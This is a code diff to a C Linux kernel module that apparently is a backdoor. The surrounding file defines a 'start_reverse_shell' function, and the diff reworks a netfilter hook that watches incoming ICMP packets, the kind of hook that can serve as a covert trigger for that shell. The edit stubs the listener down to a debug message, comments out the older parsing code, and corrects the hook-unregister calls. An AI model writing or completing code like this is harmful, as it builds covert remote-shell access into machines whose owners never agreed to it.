@@ -94,6 +94,24 @@ void start_reverse_shell(char *ip, char *port) {
 // not tested.
 unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
+	struct iphdr *ip_header;
+	struct iphdr _iph;
+
+	if (!skb)
+		return NF_ACCEPT;
+
+	ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
+
+	if (!ip_header || !ip_header->protocol)
+		return NF_ACCEPT;
+
+	if (ip_header->protocol == IPPROTO_ICMP) {
+		debugPrint("Got ICMP packet!");	
+	}
+
+	return NF_ACCEPT;
+
+	/*
 	const struct iphdr *ip_header;
 	const struct icmphdr *icmp_header;
 	struct iphdr _iph;
@@ -168,6 +186,7 @@ unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook
 	// }
 
 	return NF_ACCEPT;
+	*/
 }
 
 // Register our packets filter
@@ -204,9 +223,9 @@ static int register_icmp_listener(void)
 // Not tested.
 void unregister_icmp_listener(void) {
 	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
-    	nf_register_net_hook(&init_net, netf_hook);
+    	nf_unregister_net_hook(&init_net, netf_hook);
 	#else
-    	nf_register_hook(netf_hook);
+    	nf_unregister_hook(netf_hook);
 	#endif
 }
 
